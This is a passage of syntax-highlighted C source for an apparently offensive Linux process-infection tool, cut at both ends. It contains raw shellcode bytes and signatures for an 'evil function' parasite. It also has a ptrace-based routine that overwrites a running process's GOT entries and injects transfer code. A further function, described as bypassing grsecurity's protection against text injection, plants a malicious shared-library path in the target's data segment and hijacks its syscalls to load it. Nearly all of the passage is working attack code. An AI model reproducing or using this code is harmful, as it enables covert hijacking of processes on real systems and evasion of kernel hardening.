&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>e9<span style="color: #000099; font-weight: bold;">\x</span>3b<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>c9<span style="color: #000099; font-weight: bold;">\x</span>b0<span style="color: #000099; font-weight: bold;">\x</span>05<span style="color: #000099; font-weight: bold;">\x</span>5b<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>c9<span style="color: #000099; font-weight: bold;">\x</span>cd<span style="color: #000099; font-weight: bold;">\x</span>80<span style="color: #000099; font-weight: bold;">\x</span>83<span style="color: #000099; font-weight: bold;">\x</span>ec"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>18<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>d2<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>14<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>44<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>04<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>20<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>44"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>08<span style="color: #000099; font-weight: bold;">\x</span>07<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>44<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>0c<span style="color: #000099; font-weight: bold;">\x</span>02<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>44"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>10<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>54<span style="color: #000099; font-weight: bold;">\x</span>24<span style="color: #000099; font-weight: bold;">\x</span>14<span style="color: #000099; font-weight: bold;">\x</span>b8<span style="color: #000099; font-weight: bold;">\x</span>5a<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>e3<span style="color: #000099; font-weight: bold;">\x</span>cd<span style="color: #000099; font-weight: bold;">\x</span>80<span style="color: #000099; font-weight: bold;">\x</span>cc"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>e8<span style="color: #000099; font-weight: bold;">\x</span>c0<span style="color: #000099; font-weight: bold;">\x</span>ff<span style="color: #000099; font-weight: bold;">\x</span>ff<span style="color: #000099; font-weight: bold;">\x</span>ff<span style="color: #000099; font-weight: bold;">\x</span>2f<span style="color: #000099; font-weight: bold;">\x</span>6c<span style="color: #000099; font-weight: bold;">\x</span>69<span style="color: #000099; font-weight: bold;">\x</span>62<span style="color: #000099; font-weight: bold;">\x</span>2f<span style="color: #000099; font-weight: bold;">\x</span>6c<span style="color: #000099; font-weight: bold;">\x</span>69<span style="color: #000099; font-weight: bold;">\x</span>62<span style="color: #000099; font-weight: bold;">\x</span>74<span style="color: #000099; font-weight: bold;">\x</span>65<span style="color: #000099; font-weight: bold;">\x</span>73"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>74<span style="color: #000099; font-weight: bold;">\x</span>2e<span style="color: #000099; font-weight: bold;">\x</span>73<span style="color: #000099; font-weight: bold;">\x</span>6f<span style="color: #000099; font-weight: bold;">\x</span>2e<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>2e<span style="color: #000099; font-weight: bold;">\x</span>30<span style="color: #000099; font-weight: bold;">\x</span>00"</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* the signature for our evil function in our shared object */</span> <br>
<span style="color: #808080; font-style: italic;">/* we use the first 8 bytes of our function code */</span><br>
<span style="color: #808080; font-style: italic;">/* make sure this is modified based on your parasite (evil function) */</span> <br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> evilsig<span style="color: black;">[</span><span style="color: black;">]</span> = <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>55<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>e5<span style="color: #000099; font-weight: bold;">\x</span>83<span style="color: #000099; font-weight: bold;">\x</span>ec<span style="color: #000099; font-weight: bold;">\x</span>18<span style="color: #000099; font-weight: bold;">\x</span>c6<span style="color: #000099; font-weight: bold;">\x</span>45"</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* here is the signature for our transfer code, this will vary */</span><br>
<span style="color: #808080; font-style: italic;">/* depending on whether or not you use a function pointer or a */</span><br>
<span style="color: #808080; font-style: italic;">/* movl/jmp sequence. The one below is for a function pointer */</span><br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> tc<span style="color: black;">[</span><span style="color: black;">]</span> = <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>45<span style="color: #000099; font-weight: bold;">\x</span>fc<span style="color: #000099; font-weight: bold;">\x</span>00"</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* &nbsp;Our memrw() function serves three purposes<br>
&nbsp;1. modify .got entry with replacement function<br>
&nbsp;2. patch transfer code within replacement function<br>
&nbsp;3. read from any text memory location in process<br>
*/</span><br>
<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> evil_base;<br>
<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> memrw<span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *buf, <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> vaddr, <span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span> size, <span style="color: #993333;">int</span> pid, <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> new<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j, data;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> ret;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> ptr = vaddr;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* get the memory address of the function to hijack */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>size == MODIFY_GOT &amp;&amp; !buf<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Modifying GOT(%x)<span style="color: #000099; font-weight: bold;">\n</span>"</span>, vaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; original = <span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">)</span>ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, vaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ret = ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, vaddr, new<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">)</span>ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, vaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span>&nbsp; &nbsp; &nbsp; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">(</span>size == INJECT_TRANSFER_CODE<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Injecting %x at 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, new, vaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, vaddr, new<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; vaddr --;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">2</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, <span style="color: black;">(</span>vaddr + j<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>i<span style="color: black;">]</span> = data;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j += <span style="color: #cc66cc;">4</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Reading from process image at 0x%x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, vaddr<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>, j = <span style="color: #cc66cc;">0</span>; i &lt; size; i+= <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>uint32_t<span style="color: black;">)</span>, j++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* PTRACE_PEEK can return -1 on success, check errno */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">(</span><span style="color: black;">(</span><span style="color: black;">(</span>data = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, vaddr + i<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span> &amp;&amp; errno<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j<span style="color: black;">]</span> = data;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> i;<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* bypass grsec patch that prevents code injection into text */</span><br>
<span style="color: #993333;">int</span> grsec_mmap_library<span style="color: black;">(</span><span style="color: #993333;">int</span> pid<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> &nbsp;user_regs_struct reg;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> eip, esp, <span style="color: #993333;">string</span>, offset, str,<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax, ebx, ecx, edx, orig_eax, data;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> syscall;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j = <span style="color: #cc66cc;">0</span>, ret, status, fd;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> library_string<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> orig_ds<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> buf<span style="color: black;">[</span>MAXBUF<span style="color: black;">]</span> = <span style="color: black;">{</span><span style="color: #cc66cc;">0</span><span style="color: black;">}</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> tmp<span style="color: black;">[</span><span style="color: #cc66cc;">8192</span><span style="color: black;">]</span>, *mem;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> open_done = <span style="color: #cc66cc;">0</span>, mmap_done = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> sysenter = <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr *ehdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Phdr *phdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> libfd;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> stat lst;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> text_offset, text_length, data_offset, data_length;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>libfd = open<span style="color: black;">(</span>EVILLIB_FULLPATH, O_RDONLY<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"open"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>fstat<span style="color: black;">(</span>libfd, &amp;lst<span style="color: black;">)</span> &lt; <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"fstat"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; mem = mmap<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span>, lst.<span style="color: #202020;">st_size</span>, PROT_READ, MAP_PRIVATE, libfd, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>mem == MAP_FAILED<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"mmap"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ehdr = <span style="color: black;">(</span>Elf32_Ehdr *<span style="color: black;">)</span>mem;<br>
&nbsp; &nbsp; &nbsp; &nbsp; phdr = <span style="color: black;">(</span>Elf32_Phdr *<span style="color: black;">)</span><span style="color: black;">(</span>mem + ehdr-&gt;e_phoff<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = ehdr-&gt;e_phnum; i-- &gt; <span style="color: #cc66cc;">0</span>; phdr++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>phdr-&gt;p_type == PT_LOAD &amp;&amp; phdr-&gt;p_offset == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; text_offset = phdr-&gt;p_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; text_length = phdr-&gt;p_filesz;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; phdr++;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data_offset = phdr-&gt;p_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; data_length = phdr-&gt;p_filesz;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; strcpy<span style="color: black;">(</span>library_string, EVILLIB_FULLPATH<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* backup first part of data segment which will use for a string and some vars */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; memrw <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>orig_ds, data_segment, strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span><span style="color: #cc66cc;">+32</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* store our string for our evil lib there */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>data_segment + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>library_string + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* verify we have the correct string */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span>; i+= <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span>&amp;buf<span style="color: black;">[</span>i<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, <span style="color: black;">(</span>data_segment + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strcmp<span style="color: black;">(</span>buf, EVILLIB_FULLPATH<span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Verified string is stored in DS: %s<span style="color: #000099; font-weight: bold;">\n</span>"</span>, buf<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"String was not properly stored in DS: %s<span style="color: #000099; font-weight: bold;">\n</span>"</span>, buf<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SYSCALL, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ebx = reg.<span style="color: #202020;">ebx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ecx = reg.<span style="color: #202020;">ecx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; edx = reg.<span style="color: #202020;">edx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; eip = reg.<span style="color: #202020;">eip</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; esp = reg.<span style="color: #202020;">esp</span>; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> syscall_eip = reg.<span style="color: #202020;">eip</span> - <span style="color: #cc66cc;">20</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* this gets sysenter dynamically incase its randomized */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!static_sysenter<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>tmp, syscall_eip, <span style="color: #cc66cc;">20</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">20</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!<span style="color: black;">(</span>i % <span style="color: #cc66cc;">10</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%.2x "</span>, tmp<span style="color: black;">[</span>i<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
